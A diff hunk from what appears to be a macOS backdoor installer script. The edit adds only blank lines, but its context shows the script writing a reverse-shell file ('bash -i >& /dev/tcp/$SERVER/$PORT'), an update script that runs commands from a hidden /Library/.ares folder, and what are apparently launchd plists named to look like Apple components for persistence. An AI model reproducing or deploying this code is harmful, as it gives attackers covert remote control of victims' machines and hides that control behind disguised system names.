@@ -28,15 +28,18 @@ echo "Done."
 echo ""
 echo "Copying files..."
 echo "Copying connect.sh..."
+
 cat <<ENDOFCONNECTSH >> potato
 #!/bin/bash
 bash -i >& /dev/tcp/$SERVER/$PORT 0>&1
 wait
 ENDOFCONNECTSH
+
 echo "Done."
 echo ""
 
 echo "Copying update.sh..."
+
 cat <<ENDOFUPDATESH >> potato2
 #!/bin/bash
 
@@ -60,6 +63,7 @@ bash /Library/.ares/commands
 
 fi
 ENDOFUPDATESH
+
 echo "Done."
 echo ""
 
@@ -85,6 +89,7 @@ cat <<ENDOFCOMAPPLEUPDATE >> potato2
 </dict>
 </plist>
 ENDOFCOMAPPLEUPDATE
+
 echo "Done."
 echo ""
 
@@ -110,6 +115,7 @@ cat <<ENDOFCOMAPPLEARES >> potato
 </dict>
 </plist>
 ENDOFCOMAPPLEARES
+
 echo "Done."
 echo ""
 
